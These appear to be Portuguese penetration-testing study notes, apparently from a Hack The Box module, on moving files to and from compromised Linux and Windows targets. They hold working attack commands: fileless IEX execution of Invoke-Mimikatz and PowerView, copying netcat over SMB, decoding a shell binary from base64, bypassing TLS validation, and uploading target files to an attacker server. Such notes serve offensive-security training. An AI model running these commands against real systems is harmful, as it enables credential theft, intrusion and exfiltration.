# Transferindo-Arquivos

MAQUINA HOST
-
Gust4vo@htb[/htb]$ cd /tmp </br>
Gust4vo@htb[/htb]$ chmod +x LinEnum.sh </br>
Gust4vo@htb[/htb]$ python3 -m http.server 8000

 MAQUINA ALVO USANDO WGET COM
 -
user@remotehost$ wget http://10.10.14.1:8000/LinEnum.sh </br>
...SNIP... </br>
Saving to: 'linenum.sh' </br>
linenum.sh 100%[==============================================>] 144.86K  --.-KB/s    in 0.02s </br>
2021-02-08 18:09:19 (8.16 MB/s) - 'linenum.sh' saved [14337/14337] </br>

MAQUINA ALVO USANDO SCP
 -
 Gust4vo@htb[/htb]$ scp linenum.sh user@remotehost:/tmp/linenum.sh </br>
 user@remotehost's password: ********* </br>
 linenum.sh </br>

 ---

 Em alguns casos, talvez não consigamos transferir o arquivo. Por exemplo, o host remoto pode ter proteções de firewall que nos impedem de baixar um arquivo de nossa máquina. Neste tipo de situação, podemos usar um truque simples para base64 codificar o ficheiro </br>

 MAQUINA HOST
-
Gust4vo@htb[/htb]$ cat id_rsa |base64 -w 0;echo
</br>

MAQUINA ALVO USANDO BASE64
 -
user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA... <SNIP> ...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell

---

# Métodos de transferência de arquivos do Windows

### Método PowerShell DownloadFile

- PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
- PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')

### PowerShell Invoke-Expression DownloadString - Método Fileless

- PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')

### PowerShell Invoke-WebRequest

A partir do PowerShell 3.0, o Invocar-WebRequest O cmdlet também está disponível, mas é visivelmente mais lento para baixar arquivos. Você pode usar os aliases iwr, curl, e wget em vez do Invoke-WebRequest nome completo.

- PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1

</br>
Harmj0y compilou uma extensa lista de berços de download do PowerShell: https://gist.github.com/HarmJ0y/bb48307ffa663256e239

### Erros comuns com o PowerShell

Pode haver casos em que a configuração de lançamento inicial do Internet Explorer não tenha sido concluída, o que impede o download. Isso pode ser ignorado usando o parâmetro -UseBasicParsing.

``` ps1
PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX

Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
At line:1 char:1
+ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
+ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand

PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

Outro erro nos downloads do PowerShell está relacionado ao canal seguro SSL/TLS se o certificado não for confiável. Podemos contornar esse erro com o seguinte comando:

``` ps1
PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

### Downloads SMB

- Podemos usar o SMB para baixar arquivos do nosso Pwnbox facilmente. Precisamos criar um servidor SMB em nosso Pwnbox com servidor smbserver.py do Impacket e depois usar copy, move, PowerShell Copy-Item, ou qualquer outra ferramenta que permita a conexão com SMB.

#### Criar o Servidor SMB

```
Gust4vo@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

- Para baixar um arquivo do servidor SMB para o diretório de trabalho atual, podemos usar o seguinte comando:

```
C:\htb> copy \\192.168.220.133\share\nc.exe

        1 file(s) copied.
```

- Novas versões do Windows bloqueiam o acesso não autenticado de convidados, como podemos ver no seguinte comando:

```
C:\htb> copy \\192.168.220.133\share\nc.exe

You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
```

- Para transferir arquivos neste cenário, podemos definir um nome de usuário e uma senha usando nosso servidor Impacket SMB e montar o servidor SMB em nossa máquina de destino Windows:

```
Gust4vo@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```
```
C:\htb> net use n: \\192.168.220.133\share /user:test test

The command completed successfully.

C:\htb> copy n:\nc.exe
        1 file(s) copied.
```

### Downloads via FTP

- Podemos configurar um servidor FTP em nosso host de ataque usando Python3 pyftpdlib módulo. Pode ser instalado com o seguinte comando:

```
Gust4vo@htb[/htb]$ sudo pip3 install pyftpdlib
```
- Configure
```
Gust4vo@htb[/htb]$ sudo python3 -m pyftpdlib --port 21

[I 2022-05-17 10:09:19] concurrency model: async
[I 2022-05-17 10:09:19] masquerade (NAT) address: None
[I 2022-05-17 10:09:19] passive ports: None
[I 2022-05-17 10:09:19] >>> starting FTP server on 0.0.0.0:21, pid=3210 <<<
```
Depois que o servidor FTP é configurado, podemos executar transferências de arquivos usando o cliente FTP pré-instalado do Windows ou do PowerShell Net.WebClient.

```
PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

### PowerShell Web Uploads

Na maquina do atacante

```
Gust4vo@htb[/htb]$ pip3 install uploadserver

Collecting upload server
  Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)
Installing collected packages: uploadserver
Successfully installed uploadserver-2.0.1
```

```
Gust4vo@htb[/htb]$ python3 -m uploadserver

File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Na maquina do alvo

```
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts

[+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts
[+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373
```
